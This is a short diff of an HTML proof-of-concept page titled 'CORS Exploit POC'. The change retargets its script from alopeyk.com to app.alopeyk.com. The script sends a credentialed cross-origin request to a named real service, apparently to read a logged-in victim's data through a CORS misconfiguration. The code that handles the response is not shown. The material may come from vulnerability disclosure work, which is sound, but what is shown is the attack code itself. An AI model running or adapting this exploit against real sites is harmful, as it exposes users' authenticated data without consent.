@@ -6,7 +6,7 @@
 		<h1>CORS Exploit POC</h1>
 		<script>
 			var cors = new XMLHttpRequest();
-			var Victim_url = 'https://alopeyk.com/alopost';
+			var Victim_url = 'https://app.alopeyk.com/alopost';
 			cors.open('GET', Victim_url, true);
 			cors.withCredentials = true;
 			cors.onload = reqListener;
